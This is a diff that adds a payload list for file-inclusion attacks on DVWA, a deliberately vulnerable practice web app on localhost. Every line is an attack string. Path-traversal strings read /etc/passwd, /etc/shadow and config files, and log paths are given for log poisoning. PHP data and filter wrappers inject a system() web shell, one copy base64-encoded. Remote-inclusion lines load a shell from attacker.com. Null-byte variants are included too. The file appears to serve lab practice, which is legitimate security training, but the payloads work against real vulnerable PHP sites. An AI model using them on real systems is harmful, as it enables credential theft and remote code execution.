@@ -1,0 +1,39 @@
+# File Inclusion Payloads for DVWA
+# URL: http://localhost:8081/vulnerabilities/fi/
+
+# Local File Inclusion (LFI)
+?page=../../../etc/passwd
+?page=....//....//....//etc/passwd
+?page=..././..././..././etc/passwd
+?page=/etc/passwd
+?page=../../../etc/shadow
+
+# Config files
+?page=../../config/config.inc.php
+?page=../../../etc/apache2/apache2.conf
+?page=../../../etc/mysql/my.cnf
+
+# Log files (for log poisoning)
+?page=../../../var/log/apache2/access.log
+?page=../../../var/log/apache2/error.log
+
+# PHP Wrappers
+?page=php://filter/convert.base64-encode/resource=index.php
+?page=php://filter/convert.base64-encode/resource=../../../var/www/html/index.php
+?page=php://input  (POST data as PHP code)
+?page=data://text/plain,<?php system($_GET['cmd']); ?>
+?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
+
+# Remote File Inclusion (RFI) - if allow_url_include=On
+?page=http://attacker.com/shell.php
+?page=http://localhost:9000/shell.php
+
+# Null byte (older PHP versions)
+?page=../../../etc/passwd%00
+?page=../../../etc/passwd%00.php
+
+# DVWA specific
+?page=../../hackable/flags/fi.php
+?page=file1.php
+?page=file2.php
+?page=file3.php
